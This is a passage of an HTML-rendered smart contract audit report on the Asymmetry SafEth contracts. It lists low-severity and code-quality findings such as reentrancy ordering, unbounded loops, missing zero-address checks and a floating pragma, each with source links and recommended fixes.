9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[03] Reentrancy for <code>SafEth.unstake()</code></h2>\n<p>There is a reentrancy possibility in <code>SafEth.unstake()</code> where the tokens are burned only after the derivative withdraw.</p>\n<p>If the <code>derivatives[i].withdraw()</code> external call where to reenter into <code>SafEth.unstake()</code>, the <code>safEthAmount</code> is still not updated, since the <code>_burn()</code> is only called after, and the function doesn’t contain a nonReentranct modifier.</p>\n<p>Note: this would only be an issue for a malicious derivative contract.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L113-L120\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L113-L120</a></p>\n<h3 id=\"recommendation-4\" style=\"position:relative;\"><a href=\"#recommendation-4\" aria-label=\"recommendation 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Call <code>_burn()</code> before <code>derivatives[i].withdraw()</code> in <code>SafEth.unstake()</code>.</p>\n<h2 id=\"04-unbounded-loop\" style=\"position:relative;\"><a href=\"#04-unbounded-loop\" aria-label=\"04 unbounded loop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[04] Unbounded loop</h2>\n<p>There are multiple instances of loops executing external calls where the number of iterations is unbounded and controlled by the number of derivatives. This is not an issue on the current setup, since there are only three derivatives. </p>\n<p>However, if a large amount of derivative gets added, functionalities like <code>stake()</code> and <code>unstake()</code> could run out of gas and revert.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L84-L96\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L84-L96</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L113-L119\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L113-L119</a></p>\n<h3 id=\"recommendation-5\" style=\"position:relative;\"><a href=\"#recommendation-5\" aria-label=\"recommendation 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Limit the maximum number of derivatives that can be added.</p>\n<h2 id=\"05-emit-events-before-external-calls\" style=\"position:relative;\"><a href=\"#05-emit-events-before-external-calls\" aria-label=\"05 emit events before external calls permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[05] Emit events before external calls</h2>\n<p>Multiple functions in the project emit an event as the last statement. Wherever possible, consider emitting events before external calls. In case of reentrancy, funds are not at risk (for external call + event ordering), however emitting events after external calls can damage frontends and monitoring tools in case of reentrancy attacks.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L63-L101\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L63-L101</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L108-L129\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L108-L129</a></p>\n<h2 id=\"06-pragma-float\" style=\"position:relative;\"><a href=\"#06-pragma-float\" aria-label=\"06 pragma float permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[06] Pragma float</h2>\n<p>All contracts in scope are floating the pragma version.</p>\n<p>Locking the pragma helps to ensure that contracts do not accidentally get deployed using an outdated compiler version.</p>\n<p>Note that pragma statements can be allowed to float when a contract is intended for consumption by other developers, as in the case with contracts in a library or a package.</p>\n<h2 id=\"07-lack-of-address0-checks\" style=\"position:relative;\"><a href=\"#07-lack-of-address0-checks\" aria-label=\"07 lack of address0 checks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[07] Lack of address(0) checks</h2>\n<p>Input addresses should be checked against address(0) to prevent unexpected behavior.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L33-L36\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L33-L36</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L42-L45\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L42-L45</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L36-L38\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L36-L38</a></p>\n<h2 id=\"08-lack-of-setter-functions-for-third-party-integrations\" style=\"position:relative;\"><a href=\"#08-lack-of-setter-functions-for-third-party-integrations\" aria-label=\"08 lack of setter functions for third party integrations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[08] Lack of setter functions for third party integrations</h2>\n<p>Misdeployed values can cause failure of integrations. One addition that can be made is to add setter functions for the owner to update these addresses if necessary.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L13-L18\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L13-L18</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L20-L27\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L20-L27</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L14-L21\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L14-L21</a></p>\n<h2 id=\"09-dont-allow-adding-a-new-derivative-when-stakingunstaking-is-paused\" style=\"position:relative;\"><a href=\"#09-dont-allow-adding-a-new-derivative-when-stakingunstaking-is-paused\" aria-label=\"09 dont allow adding a new derivative when stakingunstaking is paused permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[09] Don’t allow adding a new derivative when staking/unstaking is paused</h2>\n<p>When the system is in pause mode, e.g. staking and unstaking is blocked, consider adding a check to prevent new derivatives from being added, e.g.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"89\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">require(!pausedStaking &amp;&amp; !pauseUnstaking, &quot;error&quot;);</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L182-L195\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L182-L195</a></p>\n<h2 id=\"10-critical-changes-should-use-a-two-step-pattern-and-a-timelock\" style=\"position:relative;\"><a href=\"#10-critical-changes-should-use-a-two-step-pattern-and-a-timelock\" aria-label=\"10 critical changes should use a two step pattern and a timelock permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[10] Critical changes should use a two-step pattern and a timelock</h2>\n<p>Lack of two-step procedure for critical operations leaves them error-prone.</p>\n<p>Consider adding a two-steps pattern and a timelock on critical changes to avoid modifying the system state.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L223-L226\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L223-L226</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L232-L235\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L232-L235</a></p>\n<h2 id=\"11-lack-of-event-for-parameters-changes\" style=\"position:relative;\"><a href=\"#11-lack-of-event-for-parameters-changes\" aria-label=\"11 lack of event for parameters changes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[11] Lack of event for parameters changes</h2>\n<p>Adding an event will facilitate offchain monitoring when changing system parameters.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L48-L50\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L48-L50</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L58-L60\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L58-L60</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L51-L53\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L51-L53</a></p>\n<h2 id=\"12-lack-of-old-and-new-value-for-events-related-to-parameter-updates\" style=\"position:relative;\"><a href=\"#12-lack-of-old-and-new-value-for-events-related-to-parameter-updates\" aria-label=\"12 lack of old and new value for events related to parameter updates permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[12] Lack of old and new value for events related to parameter updates</h2>\n<p>Events that mark critical parameter changes should contain both the old and the new value.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L165-L175\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L165-L175</a></p>\n<h2 id=\"13-check-for-stale-values-on-setter-functions\" style=\"position:relative;\"><a href=\"#13-check-for-stale-values-on-setter-functions\" aria-label=\"13 check for stale values on setter functions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[13] Check for stale values on setter functions</h2>\n<p>Add a check ensuring that the new value if different than the current value to avoid emitting unnecessary events.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L214-L217\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L214-L217</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L223-L226\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L223-L226</a></p>\n<h2 id=\"14-calls-for-retrieving-the-balance-can-be-cached\" style=\"position:relative;\"><a href=\"#14-calls-for-retrieving-the-balance-can-be-cached\" aria-label=\"14 calls for retrieving the balance can be cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[14] Calls for retrieving the balance can be cached</h2>\n<p><code>derivatives[i].balance()</code> can be cached on the following instance.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L141-L142\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L141-L142</a></p>\n<h2 id=\"15-variable-being-initialized-with-the-default-value\" style=\"position:relative;\"><a href=\"#15-variable-being-initialized-with-the-default-value\" aria-label=\"15 variable being initialized with the default value permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[15] Variable being initialized with the default value</h2>\n<p>Unsigned integers will already be initalized with zero on their declaration, e.g. there’s no need to manually assign zero.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L68\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L68</a></p>\n<h2 id=\"16-unnecessary-calculation\" style=\"position:relative;\"><a href=\"#16-unnecessary-calculation\" aria-label=\"16 unnecessary calculation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[16] Unnecessary calculation</h2>\n<p>Multiplying by <code>10**18</code> and dividing by <code>10**18</code> is not needed on L215 of <code>Reth.sol</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L215\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L215</a></p>\n<h2 id=\"17-missing-unit-tests\" style=\"position:relative;\"><a href=\"#17-missing-unit-tests\" aria-label=\"17 missing unit tests permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[17] Missing unit tests</h2>\n<p>The derivative contracts don’t have all functions and branches covered.</p>\n<p>It is crucial to write tests with possibly 100% coverage for smart contracts. It is recommended to write tests for all possible code flows.</p>\n<h2 id=\"18-incorrect-natspec\" style=\"position:relative;\"><a href=\"#18-incorrect-natspec\" aria-label=\"18 incorrect natspec permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[18] Incorrect NATSPEC</h2>\n<p><code>SafEth.adjustWeight()</code> contains an incorrect @notice.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L158\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L158</a></p>\n<h2 id=\"19-in-safethadjustweight-theres-no-need-to-loop-all-derivatives\" style=\"position:relative;\"><a href=\"#19-in-safethadjustweight-theres-no-need-to-loop-all-derivatives\" aria-label=\"19 in safethadjustweight theres no need to loop all derivatives permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[19] In <code>SafEth.adjustWeight()</code> there’s no need to loop all derivatives</h2>\n<p>It’s possible to decrease the old weight and increase the new weight to compute <code>localTotalWeight</code> and update <code>totalWeight</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L165-L175\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L165-L175</a></p>\n<h2 id=\"20-variable-shadowing\" style=\"position:relative;\"><a href=\"#20-variable-shadowing\" aria-label=\"20 variable shadowing permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[20] Variable shadowing</h2>\n<p>Consider renaming the variable <code>totalSupply</code> in <code>SafEth.stake()</code>, since it’s being shadowed by <code>ERC20Upgradeable.totalSupply()</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L77\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L77</a></p>\n<h2 id=\"21-usage-of-return-named-variables-and-explicit-values\" style=\"position:relative;\"><a href=\"#21-usage-of-return-named-variables-and-explicit-values\" aria-label=\"21 usage of return named variables and explicit values permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[21] Usage of return named variables and explicit values</h2>\n<p>Some functions return named variables, others return explicit values.</p>\n<p>Following function returns an explicit value.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L228-L242\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L228-L242</a></p>\n<p>Following function return returns a named variable.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L83-L102\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L83-L102</a></p>\n<p>Consider adopting the same 